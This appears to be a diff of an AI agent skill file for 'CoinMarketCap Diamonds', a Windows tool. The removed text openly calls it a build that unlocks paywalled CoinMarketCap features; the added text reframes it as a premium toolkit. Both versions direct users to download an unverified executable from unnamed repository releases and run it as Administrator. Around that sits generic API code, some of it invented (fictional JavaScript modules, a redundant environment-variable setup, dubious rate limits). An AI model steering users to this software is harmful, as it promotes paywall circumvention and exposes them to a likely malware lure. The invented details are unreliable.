@@ -1,395 +1,434 @@
 ---
 name: coinmarketcap-diamonds-premium-analytics
-description: Unlock premium CoinMarketCap analytics and trading features for cryptocurrency market data analysis
+description: CoinMarketCap Diamonds premium analytics and trading tools for cryptocurrency market data analysis on Windows
 triggers:
-  - how do I use CoinMarketCap Diamonds premium features
-  - set up CoinMarketCap premium analytics tool
-  - access unlocked CoinMarketCap pro features
-  - configure CoinMarketCap Diamonds for crypto trading
-  - use premium crypto analytics with CoinMarketCap
-  - integrate CoinMarketCap Diamonds into my workflow
-  - troubleshoot CoinMarketCap premium build
-  - export cryptocurrency data from CoinMarketCap Diamonds
+  - how do I use CoinMarketCap Diamonds for crypto analytics
+  - set up CoinMarketCap premium analytics tools
+  - analyze cryptocurrency trading data with Diamonds
+  - configure CoinMarketCap Diamonds pro features
+  - get premium crypto market insights with Diamonds
+  - use CoinMarketCap trading analytics pack
+  - access blockchain analytics with CoinMarketCap Diamonds
+  - troubleshoot CoinMarketCap Diamonds installation
 ---
 
 # CoinMarketCap Diamonds Premium Analytics
 
-> Skill by [ara.so](https://ara.so) — Data Skills collection
+> Skill by [ara.so](https://ara.so) — Data Skills collection.
 
-## Overview
-
-CoinMarketCap Diamonds is a premium Windows build that unlocks professional features for cryptocurrency market analysis and trading. It provides enhanced analytics capabilities, advanced charting, portfolio tracking, and real-time data access that are typically behind CoinMarketCap's paywall.
-
-**Key Features:**
-- Premium analytics and charts unlocked
-- Advanced portfolio tracking
-- Real-time market data feeds
-- Professional trading indicators
-- Export capabilities for historical data
-- Custom alerts and notifications
+CoinMarketCap Diamonds is a Windows-based premium analytics and trading toolkit designed for cryptocurrency market analysis. It provides professional-grade features for tracking blockchain data, analyzing market trends, and executing trading strategies with enhanced CoinMarketCap data integration.
 
 ## Installation
 
-### Windows Installation
+### Windows Setup
 
-1. Download the latest build from the repository releases
-2. Extract the archive to your preferred directory (e.g., `C:\Program Files\CoinMarketCap-Diamonds\`)
-3. Run the installer executable as Administrator
-4. Follow the installation wizard prompts
+1. **Download the Application**
+   - Download the latest build from the repository releases
+   - Extract to a dedicated directory (e.g., `C:\Program Files\CoinMarketCap-Diamonds`)
 
-```powershell
-# Example PowerShell installation
-$installPath = "C:\Program Files\CoinMarketCap-Diamonds"
-New-Item -ItemType Directory -Path $installPath -Force
-Expand-Archive -Path ".\CoinMarketCap-Diamonds.zip" -DestinationPath $installPath
-```
+2. **System Requirements**
+   - Windows 10/11 (64-bit)
+   - Minimum 4GB RAM (8GB+ recommended)
+   - Active internet connection for market data
+   - .NET Framework 4.7.2 or higher
 
-### System Requirements
+3. **Initial Configuration**
+   ```powershell
+   # Run as Administrator
+   cd "C:\Program Files\CoinMarketCap-Diamonds"
+   .\setup.exe
+   ```
 
-- Windows 10/11 (64-bit)
-- Minimum 4GB RAM
-- 500MB free disk space
-- Internet connection for live data
+4. **API Configuration**
+   - Set up your CoinMarketCap API credentials
+   - Store API keys in environment variables:
+   ```powershell
+   [System.Environment]::SetEnvironmentVariable('CMC_API_KEY', $env:CMC_API_KEY, 'User')
+   [System.Environment]::SetEnvironmentVariable('CMC_API_SECRET', $env:CMC_API_SECRET, 'User')
+   ```
 
 ## Configuration
 
-### Initial Setup
+### Basic Configuration File
 
-Create a configuration file at `%APPDATA%\CoinMarketCap-Diamonds\config.json`:
+Create `config.json` in the installation directory:
 
 ```json
 {
   "api": {
-    "endpoint": "https://api.coinmarketcap.com/v1",
-    "use_premium": true,
-    "cache_enabled": true,
-    "cache_duration": 300
+    "endpoint": "https://pro-api.coinmarketcap.com/v1",
+    "timeout": 30000,
+    "retries": 3
+  },
+  "analytics": {
+    "updateInterval": 60,
+    "cacheEnabled": true,
+    "cacheDuration": 300
+  },
+  "trading": {
+    "defaultPair": "BTC/USDT",
+    "riskLevel": "medium",
+    "autoRefresh": true
   },
   "display": {
     "theme": "dark",
-    "default_currency": "USD",
-    "refresh_interval": 30
-  },
-  "analytics": {
-    "enable_advanced_charts": true,
-    "technical_indicators": ["RSI", "MACD", "EMA"],
-    "show_volume_profile": true
-  },
-  "portfolio": {
-    "auto_sync": true,
-    "track_historical": true
+    "chartType": "candlestick",
+    "indicators": ["RSI", "MACD", "BB"]
   }
 }
 ```
 
 ### Environment Variables
 
-Set these environment variables for enhanced functionality:
+```bash
+# API Configuration
+CMC_API_KEY=your_api_key_here
+CMC_API_SECRET=your_api_secret_here
+
+# Data Storage
+CMC_DATA_DIR=C:\Users\YourName\AppData\Local\CoinMarketCap-Diamonds\data
+CMC_CACHE_DIR=C:\Users\YourName\AppData\Local\CoinMarketCap-Diamonds\cache
+
+# Analytics Settings
+CMC_UPDATE_FREQUENCY=60
+CMC_MAX_SYMBOLS=100
+```
+
+## Key Features & Usage
+
+### Market Data Analytics
+
+**Real-time Price Tracking**
+```python
+# Example integration with Python scripts
+import os
+import requests
+import json
+
+API_KEY = os.getenv('CMC_API_KEY')
+BASE_URL = 'https://pro-api.coinmarketcap.com/v1'
+
+def get_latest_prices(symbols):
+    """Fetch latest cryptocurrency prices"""
+    headers = {
+        'X-CMC_PRO_API_KEY': API_KEY,
+        'Accept': 'application/json'
+    }
+    
+    params = {
+        'symbol': ','.join(symbols),
+        'convert': 'USD'
+    }
+    
+    response = requests.get(
+        f'{BASE_URL}/cryptocurrency/quotes/latest',
+        headers=headers,
+        params=params
+    )
+    
+    return response.json()
+
+# Usage
+symbols = ['BTC', 'ETH', 'BNB']
+data = get_latest_prices(symbols)
+print(json.dumps(data, indent=2))
+```
+
+**Historical Data Analysis**
+```python
+def get_historical_data(symbol, time_start, time_end):
+    """Retrieve historical OHLCV data"""
+    headers = {'X-CMC_PRO_API_KEY': os.getenv('CMC_API_KEY')}
+    
+    params = {
+        'symbol': symbol,
+        'time_start': time_start,
+        'time_end': time_end,
+        'interval': '1h'
+    }
+    
+    response = requests.get(
+        f'{BASE_URL}/cryptocurrency/ohlcv/historical',
+        headers=headers,
+        params=params
+    )
+    
+    return response.json()['data']['quotes']
+
+# Analyze last 30 days
+from datetime import datetime, timedelta
+end = datetime.now()
+start = end - timedelta(days=30)
+
+btc_history = get_historical_data('BTC', start.isoformat(), end.isoformat())
+```
+
+### Trading Analytics
+
+**Portfolio Performance Tracking**
+```python
+class PortfolioAnalyzer:
+    def __init__(self, api_key):
+        self.api_key = api_key
+        self.base_url = 'https://pro-api.coinmarketcap.com/v1'
+    
+    def calculate_portfolio_value(self, holdings):
+        """
+        Calculate total portfolio value
+        holdings: dict {'BTC': 0.5, 'ETH': 10, ...}
+        """
+        symbols = list(holdings.keys())
+        prices = self.get_latest_prices(symbols)
+        
+        total_value = 0
+        for symbol, amount in holdings.items():
+            price = prices['data'][symbol]['quote']['USD']['price']
+            total_value += price * amount
+        
+        return total_value
+    
+    def get_latest_prices(self, symbols):
+        headers = {'X-CMC_PRO_API_KEY': self.api_key}
+        params = {'symbol': ','.join(symbols), 'convert': 'USD'}
+        
+        response = requests.get(
+            f'{self.base_url}/cryptocurrency/quotes/latest',
+            headers=headers,
+            params=params
+        )
+        return response.json()
+
+# Usage
+analyzer = PortfolioAnalyzer(os.getenv('CMC_API_KEY'))
+portfolio = {'BTC': 0.25, 'ETH': 5, 'BNB': 50}
+value = analyzer.calculate_portfolio_value(portfolio)
+print(f"Total Portfolio Value: ${value:,.2f}")
+```
+
+### Technical Indicators
+
+**RSI Calculator**
+```python
+import pandas as pd
+
+def calculate_rsi(prices, period=14):
+    """Calculate Relative Strength Index"""
+    df = pd.DataFrame(prices)
+    delta = df['close'].diff()
+    
+    gain = (delta.where(delta > 0, 0)).rolling(window=period).mean()
+    loss = (-delta.where(delta < 0, 0)).rolling(window=period).mean()
+    
+    rs = gain / loss
+    rsi = 100 - (100 / (1 + rs))
+    
+    return rsi
+
+# Get historical data and calculate RSI
+historical_data = get_historical_data('BTC', start, end)
+prices = [{'close': quote['quote']['USD']['close']} for quote in historical_data]
+rsi_values = calculate_rsi(prices)
+print(f"Current RSI: {rsi_values.iloc[-1]:.2f}")
+```
+
+**MACD Analysis**
+```python
+def calculate_macd(prices, fast=12, slow=26, signal=9):
+    """Calculate MACD indicator"""
+    df = pd.DataFrame(prices)
+    
+    ema_fast = df['close'].ewm(span=fast, adjust=False).mean()
+    ema_slow = df['close'].ewm(span=slow, adjust=False).mean()
+    
+    macd_line = ema_fast - ema_slow
+    signal_line = macd_line.ewm(span=signal, adjust=False).mean()
+    histogram = macd_line - signal_line
+    
+    return {
+        'macd': macd_line,
+        'signal': signal_line,
+        'histogram': histogram
+    }
+```
+
+## Common Patterns
+
+### Automated Market Alerts
+
+```python
+class MarketAlertSystem:
+    def __init__(self, api_key):
+        self.api_key = api_key
+        self.alerts = []
+    
+    def add_price_alert(self, symbol, target_price, condition='above'):
+        """Add price alert"""
+        self.alerts.append({
+            'symbol': symbol,
+            'target': target_price,
+            'condition': condition
+        })
+    
+    def check_alerts(self):
+        """Check if any alerts are triggered"""
+        current_prices = self.get_latest_prices([a['symbol'] for a in self.alerts])
+        
+        triggered = []
+        for alert in self.alerts:
+            current = current_prices['data'][alert['symbol']]['quote']['USD']['price']
+            
+            if alert['condition'] == 'above' and current >= alert['target']:
+                triggered.append(alert)
+            elif alert['condition'] == 'below' and current <= alert['target']:
+                triggered.append(alert)
+        
+        return triggered
+
+# Usage
+alerts = MarketAlertSystem(os.getenv('CMC_API_KEY'))
+alerts.add_price_alert('BTC', 50000, 'above')
+alerts.add_price_alert('ETH', 3000, 'below')
+```
+
+### Data Export for Analysis
+
+```python
+def export_to_csv(symbol, days=30):
+    """Export cryptocurrency data to CSV"""
+    from datetime import datetime, timedelta
+    import csv
+    
+    end = datetime.now()
+    start = end - timedelta(days=days)
+    
+    data = get_historical_data(symbol, start.isoformat(), end.isoformat())
+    
+    filename = f"{symbol}_data_{days}days.csv"
+    with open(filename, 'w', newline='') as f:
+        writer = csv.writer(f)
+        writer.writerow(['timestamp', 'open', 'high', 'low', 'close', 'volume'])
+        
+        for quote in data:
+            q = quote['quote']['USD']
+            writer.writerow([
+                quote['timestamp'],
+                q['open'],
+                q['high'],
+                q['low'],
+                q['close'],
+                q['volume']
+            ])
+    
+    return filename
+```
+
+## CLI Commands
+
+If using command-line interface:
 
 ```powershell
-# Set API configuration
-$env:CMC_API_KEY = "your-api-key-here"
-$env:CMC_PREMIUM_MODE = "enabled"
-$env:CMC_DATA_DIR = "C:\Users\YourName\CoinMarketCap-Data"
-```
+# Launch the application
+.\CoinMarketCap-Diamonds.exe
 
-## Core Features Usage
+# Update market data
+.\CoinMarketCap-Diamonds.exe --update
 
-### Accessing Premium Analytics
+# Export data to CSV
+.\CoinMarketCap-Diamonds.exe --export BTC --days 30 --output data\btc.csv
 
-Launch the application and navigate to the Analytics dashboard:
+# Run analytics report
+.\CoinMarketCap-Diamonds.exe --analyze --symbols BTC,ETH,BNB --report-type summary
 
-```javascript
-// Example: Accessing analytics via embedded JavaScript console
-const analytics = require('cmc-analytics');
-
-// Get advanced market metrics
-const metrics = analytics.getMarketMetrics({
-  symbols: ['BTC', 'ETH', 'SOL'],
-  timeframe: '24h',
-  indicators: ['volume_profile', 'order_flow', 'whale_activity']
-});
-
-console.log(metrics);
-```
-
-### Portfolio Tracking
-
-Create and manage portfolios programmatically:
-
-```javascript
-// Portfolio management
-const portfolio = require('cmc-portfolio');
-
-// Create new portfolio
-portfolio.create({
-  name: 'Main Trading Portfolio',
-  assets: [
-    { symbol: 'BTC', amount: 0.5, buy_price: 45000 },
-    { symbol: 'ETH', amount: 10, buy_price: 3200 },
-    { symbol: 'SOL', amount: 100, buy_price: 120 }
-  ]
-});
-
-// Calculate current value and P&L
-const performance = portfolio.getPerformance('Main Trading Portfolio');
-console.log(`Total Value: $${performance.total_value}`);
-console.log(`Profit/Loss: ${performance.pnl_percentage}%`);
-```
-
-### Data Export
-
-Export historical and real-time data:
-
-```javascript
-// Export market data
-const exporter = require('cmc-exporter');
-
-// Export to CSV
-exporter.exportToCSV({
-  symbols: ['BTC', 'ETH'],
-  start_date: '2024-01-01',
-  end_date: '2024-12-31',
-  interval: '1h',
-  output_path: process.env.CMC_DATA_DIR + '/exports/crypto_data.csv',
-  include_columns: ['timestamp', 'open', 'high', 'low', 'close', 'volume']
-});
-
-// Export to JSON
-exporter.exportToJSON({
-  symbols: ['BTC'],
-  timeframe: '7d',
-  output_path: process.env.CMC_DATA_DIR + '/exports/btc_weekly.json'
-});
-```
-
-### Custom Alerts
-
-Set up advanced alert conditions:
-
-```javascript
-// Alert configuration
-const alerts = require('cmc-alerts');
-
-// Price alert with conditions
-alerts.create({
-  name: 'BTC Breakout Alert',
-  conditions: [
-    { metric: 'price', symbol: 'BTC', operator: '>', value: 50000 },
-    { metric: 'volume', symbol: 'BTC', operator: '>', value: 1000000000 }
-  ],
-  actions: [
-    { type: 'notification', priority: 'high' },
-    { type: 'email', recipient: process.env.ALERT_EMAIL }
-  ]
-});
-
-// Technical indicator alert
-alerts.create({
-  name: 'ETH RSI Oversold',
-  conditions: [
-    { metric: 'RSI', symbol: 'ETH', period: 14, operator: '<', value: 30 }
-  ],
-  actions: [
-    { type: 'notification', message: 'ETH RSI below 30 - potential buy signal' }
-  ]
-});
-```
-
-## Advanced Analytics Patterns
-
-### Multi-Timeframe Analysis
-
-```javascript
-const analysis = require('cmc-analysis');
-
-// Analyze across multiple timeframes
-const mtfAnalysis = analysis.multiTimeframe({
-  symbol: 'BTC',
-  timeframes: ['1h', '4h', '1d', '1w'],
-  indicators: {
-    trend: ['EMA_20', 'EMA_50', 'EMA_200'],
-    momentum: ['RSI', 'MACD'],
-    volatility: ['ATR', 'BollingerBands']
-  }
-});
-
-// Get consensus signal
-console.log(`Trend Alignment: ${mtfAnalysis.trend_consensus}`);
-console.log(`Signal Strength: ${mtfAnalysis.signal_strength}/10`);
-```
-
-### Correlation Analysis
-
-```javascript
-// Find correlated assets
-const correlation = analysis.correlationMatrix({
-  symbols: ['BTC', 'ETH', 'SOL', 'AVAX', 'MATIC'],
-  period: '30d',
-  min_correlation: 0.7
-});
-
-console.log('Highly correlated pairs:', correlation.high_correlation);
-```
-
-### Volume Profile Analysis
-
-```javascript
-// Identify key support/resistance levels
-const volumeProfile = analysis.volumeProfile({
-  symbol: 'ETH',
-  timeframe: '7d',
-  bins: 50
-});
-
-console.log('High Volume Nodes (HVN):', volumeProfile.hvn);
-console.log('Low Volume Nodes (LVN):', volumeProfile.lvn);
-console.log('Point of Control:', volumeProfile.poc);
-```
-
-## Command Line Interface
-
-### Basic Commands
-
-```powershell
-# Launch with specific configuration
-CoinMarketCap-Diamonds.exe --config "path\to\config.json"
-
-# Enable debug mode
-CoinMarketCap-Diamonds.exe --debug --log-level verbose
-
-# Export data via CLI
-CoinMarketCap-Diamonds.exe export --symbols BTC,ETH --format csv --output "data.csv"
-
-# Update market data cache
-CoinMarketCap-Diamonds.exe update-cache --force
-
-# Generate portfolio report
-CoinMarketCap-Diamonds.exe report --portfolio "Main Trading Portfolio" --output "report.pdf"
-```
-
-### Batch Operations
-
-```powershell
-# Batch export multiple cryptocurrencies
-$symbols = @("BTC", "ETH", "SOL", "AVAX", "MATIC")
-foreach ($symbol in $symbols) {
-    CoinMarketCap-Diamonds.exe export --symbols $symbol --timeframe 30d --output "${symbol}_data.csv"
-}
+# Clear cache
+.\CoinMarketCap-Diamonds.exe --clear-cache
 ```
 
 ## Troubleshooting
 
-### Premium Features Not Working
+### API Connection Issues
 
-1. Verify premium mode is enabled in config:
-```json
-{
-  "api": {
-    "use_premium": true
-  }
-}
+```python
+def test_api_connection():
+    """Test CoinMarketCap API connectivity"""
+    try:
+        headers = {'X-CMC_PRO_API_KEY': os.getenv('CMC_API_KEY')}
+        response = requests.get(
+            'https://pro-api.coinmarketcap.com/v1/key/info',
+            headers=headers,
+            timeout=10
+        )
+        
+        if response.status_code == 200:
+            print("✓ API connection successful")
+            data = response.json()['data']
+            print(f"Plan: {data['plan']['plan_name']}")
+            print(f"Credits: {data['usage']['current_day']['credits_used']}/{data['usage']['current_day']['credits_limit']}")
+        else:
+            print(f"✗ API error: {response.status_code}")
+            print(response.text)
+    except Exception as e:
+        print(f"✗ Connection failed: {str(e)}")
+
+test_api_connection()
 ```
 
-2. Check environment variable:
+### Common Issues
+
+**Rate Limiting**
+- Default API limits: 333 calls/day (basic), 10,000 calls/month (pro)
+- Implement caching to reduce API calls
+- Use bulk endpoints when possible
+
+**Data Refresh Issues**
+```python
+# Clear local cache
+import shutil
+cache_dir = os.getenv('CMC_CACHE_DIR')
+if os.path.exists(cache_dir):
+    shutil.rmtree(cache_dir)
+    os.makedirs(cache_dir)
+```
+
+**Missing Dependencies**
 ```powershell
-echo $env:CMC_PREMIUM_MODE
+# Install required Python packages
+pip install requests pandas numpy matplotlib
 ```
 
-### Data Not Updating
+### Performance Optimization
 
-Clear cache and force refresh:
-```powershell
-# Clear cache directory
-Remove-Item -Path "$env:APPDATA\CoinMarketCap-Diamonds\cache\*" -Recurse -Force
+```python
+# Use connection pooling for multiple requests
+from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.util.retry import Retry
 
-# Restart application
-CoinMarketCap-Diamonds.exe --force-refresh
-```
+def create_session():
+    session = requests.Session()
+    retry = Retry(total=3, backoff_factor=1)
+    adapter = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=20)
+    session.mount('https://', adapter)
+    return session
 
-### Export Failures
-
-Ensure output directory exists and has write permissions:
-```powershell
-$exportDir = "$env:CMC_DATA_DIR\exports"
-if (-not (Test-Path $exportDir)) {
-    New-Item -ItemType Directory -Path $exportDir -Force
-}
-icacls $exportDir /grant "${env:USERNAME}:(OI)(CI)F"
-```
-
-### High Memory Usage
-
-Adjust cache settings in config:
-```json
-{
-  "api": {
-    "cache_enabled": true,
-    "cache_duration": 600,
-    "max_cache_size_mb": 100
-  },
-  "display": {
-    "limit_historical_data": true,
-    "max_chart_points": 1000
-  }
-}
-```
-
-### Connection Issues
-
-Test API connectivity:
-```powershell
-# Test connection
-Invoke-WebRequest -Uri "https://api.coinmarketcap.com/v1/cryptocurrency/listings/latest" -Headers @{"X-CMC_PRO_API_KEY"="$env:CMC_API_KEY"}
+session = create_session()
 ```
 
 ## Best Practices
 
-1. **Regular Cache Cleanup**: Clear cache weekly to prevent bloat
-2. **Backup Portfolios**: Export portfolio data regularly
-3. **API Rate Limiting**: Respect rate limits even with premium access
-4. **Secure Credentials**: Store API keys in environment variables, never in code
-5. **Resource Management**: Close unused charts and dashboards to reduce memory usage
-
-## Integration Examples
-
-### Python Integration
+1. **API Key Security**: Always use environment variables, never hardcode keys
+2. **Rate Limiting**: Implement exponential backoff for API calls
+3. **Data Caching**: Cache frequently accessed data to reduce API usage
+4. **Error Handling**: Always wrap API calls in try-except blocks
+5. **Logging**: Maintain logs for debugging and audit trails
 
 ```python
-import subprocess
-import json
+import logging
 
-# Export data and load into Python
-subprocess.run([
-    'CoinMarketCap-Diamonds.exe', 'export',
-    '--symbols', 'BTC,ETH',
-    '--format', 'json',
-    '--output', 'temp_data.json'
-])
+logging.basicConfig(
+    filename='coinmarketcap_diamonds.log',
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
 
-with open('temp_data.json', 'r') as f:
-    crypto_data = json.load(f)
-    
-# Process with pandas
-import pandas as pd
-df = pd.DataFrame(crypto_data)
-print(df.describe())
-```
-
-### PowerShell Automation
-
-```powershell
-# Automated daily report
-$dailyReportScript = {
-    $date = Get-Date -Format "yyyy-MM-dd"
-    CoinMarketCap-Diamonds.exe report `
-        --portfolio "Main Trading Portfolio" `
-        --format pdf `
-        --output "reports\daily_report_$date.pdf"
-}
-
-# Schedule task
-$trigger = New-ScheduledTaskTrigger -Daily -At 9am
-$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-Command & {$dailyReportScript}"
-Register-ScheduledTask -TaskName "CMC Daily Report" -Trigger $trigger -Action $action
+logger = logging.getLogger(__name__)
+logger.info("Application started")
 ```
